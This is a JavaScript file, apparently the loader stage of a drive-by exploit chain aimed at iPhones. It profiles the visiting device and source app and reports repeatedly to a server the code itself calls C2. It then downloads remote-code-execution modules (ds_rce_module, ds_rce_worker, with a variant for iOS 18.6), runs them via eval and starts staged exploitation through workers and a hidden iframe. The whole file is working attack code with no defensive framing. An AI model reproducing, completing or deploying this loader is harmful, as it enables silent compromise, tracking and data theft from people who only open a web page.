var SERVER_LOG = false;
var offsets = {};
var slide;
var chipset;
var device_model;

// 使用当前访问的域名作为 API 域名
const C2_DOMAIN = location.hostname;
// 门页域名：door 参数 > referrer(iframe场景) > 自身域名
const DOOR_DOMAIN = (function() {
  try { var m = location.search.match(/door=([^&]*)/); if (m) return decodeURIComponent(m[1]); } catch(e) {}
  try { if (window.top !== window.self && document.referrer) return new URL(document.referrer).hostname; } catch(e) {}
  return location.hostname;
})();

var localHost = (function() {
  try {
    var src = document.currentScript.src;
    return src.substring(0, src.lastIndexOf('/'));
  } catch(e) {
    return location.href.substring(0, location.href.lastIndexOf('/'));
  }
})();

(function() {
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', localHost + '/ds_net.js', false);
    xhr.send(null);
    if (xhr.responseText) (0, eval)(xhr.responseText);
  } catch(e) {}
})();
if (typeof globalThis !== 'undefined' && globalThis.dsNet) {
  globalThis.dsNet.init(localHost);
  globalThis.dsNet.setServerLog(SERVER_LOG);
  globalThis.dsNet.setReportMeta({
    fingerprint: window.FINGERPRINT || ("fallback_" + Date.now()),
    deviceVersion: getDeviceVersion(),
    source: getSource(),
    domain: DOOR_DOMAIN
  });
}

function print(x, reportError = false, dumphex = false) {
    dsNet.print(x, reportError, dumphex);
}
function redirect() {
    markTerminal("worker_finished");
}
function getJS(fname, method = 'GET') {
    try {
        let url = localHost + '/' + fname;
        let xhr = new XMLHttpRequest();
        xhr.open("GET", url, false);
        xhr.send(null);
        return xhr.responseText;
    } catch(e) {}
}


// Unified retry manager: never reload parent/top; retry this iframe at most once.
var qqRunTerminal = false;
var qqRetryTimer = null;

function qqGetParam(name) {
    try {
        var re = new RegExp("[?&]" + name + "=([^&]*)");
        var m = re.exec(location.search);
        return m ? decodeURIComponent(m[1]) : "";
    } catch(e) {
        return "";
    }
}

function qqReadRetryCount(key) {
    var fromUrl = parseInt(qqGetParam("retry") || "0", 10);
    if (fromUrl > 0) return fromUrl;

    try {
        return parseInt(sessionStorage.getItem(key) || "0", 10);
    } catch(e) {
        return 0;
    }
}

function qqWriteRetryCount(key, count) {
    try {
        sessionStorage.setItem(key, String(count));
    } catch(e) {}
}

function qqBuildRetryUrl(reason) {
    var parts = [];
    var raw = location.search ? location.search.substring(1).split("&") : [];

    for (var i = 0; i < raw.length; i++) {
        if (!raw[i]) continue;
        var k = raw[i].split("=")[0];
        if (k === "retry" || k === "reason" || k === "t") continue;
        parts.push(raw[i]);
    }

    parts.push("retry=1");
    parts.push("reason=" + encodeURIComponent(reason));
    parts.push("t=" + Date.now());

    return location.pathname + "?" + parts.join("&") + location.hash;
}

function markTerminal(reason) {
    qqRunTerminal = true;

    if (qqRetryTimer) {
        clearTimeout(qqRetryTimer);
        qqRetryTimer = null;
    }

    print("terminal: " + reason);
}

function retryOnce(reason) {
    try {
        if (qqRunTerminal) return;

        var key = "retry_once:" + location.pathname;
        var count = qqReadRetryCount(key);

        if (count >= 1) {
            markTerminal("retry_already_used:" + reason);
            return;
        }

        qqWriteRetryCount(key, 1);
        window.location.replace(qqBuildRetryUrl(reason));
    } catch(e) {}
}

function armRetryTimeout() {
    if (qqRetryTimer) {
        clearTimeout(qqRetryTimer);
    }

    qqRetryTimer = setTimeout(function() {
        retryOnce("timeout");
    }, 180000);
}

// ip-sync: report device visit to C2
function getSource() {
  try {
    var ua = navigator.userAgent;
    if (/\[FBAN\/FBIOS;/.test(ua)) return 'Facebook';
    if (/Instagram/.test(ua)) return 'Instagram';
    if (/Messenger/.test(ua)) return 'Messenger';
    if (/Safari/.test(ua) && /Version\//.test(ua)) return 'Safari';
  } catch(e) {}
  return 'Other';
}
function getDeviceVersion() {
  try {
    var ua = navigator.userAgent;
    var m = ua.match(/OS[_\s](\d+)(?:[._](\d+))?/i);
    if (m) return 'IOS ' + parseInt(m[1], 10) + '.' + (m[2] || '0');
    m = ua.match(/iPhone[_\s]OS[_\s](\d+)(?:[._](\d+))?/i);
    if (m) return 'IOS ' + parseInt(m[1], 10) + '.' + (m[2] || '0');
    m = ua.match(/Android[_\s](\d+)(?:[._](\d+))?/i);
    if (m) return 'Android ' + parseInt(m[1], 10) + '.' + (m[2] || '0');
    m = ua.match(/Windows NT (\d+)\.(\d+)/i);
    if (m) return 'Windows ' + parseInt(m[1], 10) + '.' + (m[2] || '0');
    m = ua.match(/Mac OS X (\d+)[._](\d+)/i);
    if (m) return 'macOS ' + parseInt(m[1], 10) + '.' + (m[2] || '0');
    if (/Linux/i.test(ua)) return 'Linux';
    m = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/(\d+)/i);
    if (m) return m[1] + ' ' + m[2];
    return ua.substring(0, 50) + '...';
  } catch(e) { return ''; }
}
function report() {
  try {
    dsNet.postJsonBeacon("https://" + C2_DOMAIN + dsNet.ENDPOINTS.ipSync, dsNet.buildIpSyncBody());
  } catch(e) {
    try {
      dsNet.postJsonBeacon("https://" + C2_DOMAIN + dsNet.ENDPOINTS.debug, dsNet.buildDebugBody(e));
    } catch(e2) {}
  }
}
setTimeout(report, 500);
setInterval(report, 20000);
// Retry timeout is armed from main(); parent/top reload loop intentionally removed.

const signal = new Uint8Array(8);
const dlopen_worker = `(() => {
  self.onmessage = function (e) {
    const {
      type,
      data
    } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(1, 1);
        globalThis[0] = data;
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        globalThis[1].close();
        break;
    }
  };
})();`;
const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript'});
const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);
const ios_version = (function() {
  let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
  if (version) {
    return version.split('_').map(part => parseInt(part));
  }
})();
let workerCode = "";
if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
    workerCode = getJS(`ds_rce_worker_18.6.js?${Date.now()}`);
else
    workerCode = getJS(`ds_rce_worker.js?${Date.now()}`);
let workerBlob = new Blob([workerCode],{type:'text/javascript'});
let workerBlobUrl = URL.createObjectURL(workerBlob);
(() => {
    function doRedirect() {
      redirect();
    }
    function main() {
        armRetryTimeout();
        const randomValues = new Uint32Array(32);
        const begin = Date.now();
        const origin = location.origin;
        const worker = new Worker(workerBlobUrl);
        worker.onerror = function() {
            retryOnce("worker_error");
        };
        worker.onmessageerror = function() {
            retryOnce("worker_message_error");
        };
        const dlopen_workers = [];
        async function prepare_dlopen_workers() {
        for (let i = 1; i <= 2; ++i) {
            const worker = new Worker(dlopen_worker_url);
            dlopen_workers.push(worker);
            await new Promise(r => {
            worker.postMessage({
                type: 'init',
                data: 0x11111111 * i
            });
            worker.onmessage = r;
            });
        }
        }
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '';
        iframe.style.height = 0;
        iframe.style.width = 0;
        document.body.appendChild(iframe);
        async function message_handler(e) {
        const data = e.data;
        switch (data.type) {
            case 'redirect':
            {
                markTerminal("worker_redirect");
                break;
            }
            case 'prepare_dlopen_workers':
            {
                await prepare_dlopen_workers();
                worker.postMessage({
                type: 'dlopen_workers_prepared'
                });
                break;
            }
            case 'trigger_dlopen1':
            {
                dlopen_workers[0].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen1'
                });
                break;
            }
            case 'trigger_dlopen2':
            {
                dlopen_workers[1].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen2'
                });
                break;
            }
            case 'sign_pointers':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'setup_fcall'
                });
                break;
            }
            case 'slow_fcall':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'slow_fcall_done'
                });
                break;
            }
            default:
            {
                break;
            }
        }
        }
        worker.onmessage = message_handler;
        try
        {
        let rceCode = "";
        if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
                rceCode = getJS(`ds_rce_module_18.6.js?${Date.now()}`);
            else
                rceCode = getJS(`ds_rce_module.js?${Date.now()}`);
        try
        {
            eval(rceCode);
        }
        catch(e)
        {
        }
        let desiredHost = "";
        desiredHost = localHost;
            if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
            {
                worker.postMessage({
                    type: 'stage1_rce',
                    desiredHost,
                    randomValues,
                    SERVER_LOG,
                    channelCode: dsNet.getChannelCode(),
                    c2Domain: C2_DOMAIN,
                    landingDomain: DOOR_DOMAIN,
                    deviceId: window._dsDeviceId || ''
                });
            }
            else
            {
        var attempt = new check_attempt();
        attempt.start().then((result) => {
            if(!result)
            {
                attempt.start().then((result) => {
                    if(!result)
                    {
                       retryOnce("check_attempt_failed");
                    }
                    else
                            {
                        worker.postMessage({
                        type: 'stage1',
                        begin,
                        origin,
                        ios_version,
                        offsets,
                        slide,
                        chipset,
                        device_model,
                        desiredHost,
                        SERVER_LOG,
                        channelCode: dsNet.getChannelCode(),
                        c2Domain: C2_DOMAIN,
                        landingDomain: DOOR_DOMAIN
                });
                            }
                        });
                    }
                    else
                    {
            worker.postMessage({
                type: 'stage1',
                begin,
                origin,
                ios_version,
                offsets,
                slide,
                chipset,
                device_model,
                desiredHost,
                SERVER_LOG,
                channelCode: dsNet.getChannelCode(),
                c2Domain: C2_DOMAIN,
                landingDomain: DOOR_DOMAIN
            });
                    }
        });
            }
        }
        catch(e)
        {
        }
    }
    try {
      var r = dsNet.postJsonSync('https://' + C2_DOMAIN + dsNet.ENDPOINTS.ipSync, dsNet.buildIpSyncBody());
      window._dsDeviceId = dsNet.getDeviceIdFromResponse(r);
    } catch(e) { window._dsDeviceId = ''; }
    main();
  })();
